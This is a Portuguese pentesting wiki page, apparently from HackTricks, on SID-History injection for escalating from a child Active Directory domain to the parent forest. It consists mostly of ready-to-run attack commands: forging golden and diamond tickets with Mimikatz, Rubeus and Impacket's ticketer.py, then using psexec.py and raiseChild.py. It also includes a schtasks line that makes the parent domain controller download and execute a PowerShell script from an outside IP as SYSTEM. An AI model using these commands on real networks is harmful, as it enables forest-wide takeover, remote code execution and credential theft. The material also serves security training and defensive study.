# Injeção de SID-History

{{#include ../../banners/hacktricks-training.md}}

## Ataque de Injeção de SID History

O foco do **Ataque de Injeção de SID History** é auxiliar **na migração de usuários entre domínios** enquanto garante o acesso contínuo a recursos do domínio anterior. Isso é realizado **incorporando o Identificador de Segurança (SID) anterior do usuário no SID History** de sua nova conta. Notavelmente, esse processo pode ser manipulado para conceder acesso não autorizado ao adicionar o SID de um grupo de alto privilégio (como Enterprise Admins ou Domain Admins) do domínio pai ao SID History. Essa exploração confere acesso a todos os recursos dentro do domínio pai.

Existem dois métodos para executar esse ataque: através da criação de um **Golden Ticket** ou um **Diamond Ticket**.

Para identificar o SID do grupo **"Enterprise Admins"**, é necessário primeiro localizar o SID do domínio raiz. Após a identificação, o SID do grupo Enterprise Admins pode ser construído anexando `-519` ao SID do domínio raiz. Por exemplo, se o SID do domínio raiz for `S-1-5-21-280534878-1496970234-700767426`, o SID resultante para o grupo "Enterprise Admins" seria `S-1-5-21-280534878-1496970234-700767426-519`.

Você também pode usar os grupos **Domain Admins**, que terminam em **512**.

Outra maneira de encontrar o SID de um grupo do outro domínio (por exemplo, "Domain Admins") é com:
```powershell
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
### Golden Ticket (Mimikatz) com KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Para mais informações sobre golden tickets, consulte:

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket (Rubeus + KRBTGT-AES256)
```powershell
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

# Or a ptt with a golden ticket
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt

# You can use "Administrator" as username or any other string
```
Para mais informações sobre diamond tickets, consulte:

{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Escalar para DA de root ou administrador da Enterprise usando o hash KRBTGT do domínio comprometido:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Com as permissões adquiridas pelo ataque, você pode executar, por exemplo, um ataque DCSync no novo domínio:

{{#ref}}
dcsync.md
{{#endref}}

### Do linux

#### Manual com [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automático usando [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Este é um script do Impacket que **automatiza a elevação do domínio filho para o domínio pai**. O script precisa de:

- Controlador de domínio de destino
- Credenciais de um usuário administrador no domínio filho

O fluxo é:

- Obtém o SID do grupo Enterprise Admins do domínio pai
- Recupera o hash da conta KRBTGT no domínio filho
- Cria um Golden Ticket
- Faz login no domínio pai
- Recupera credenciais para a conta Administrator no domínio pai
- Se o switch `target-exec` for especificado, autentica-se no Controlador de Domínio do domínio pai via Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Referências

- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{{#include ../../banners/hacktricks-training.md}}
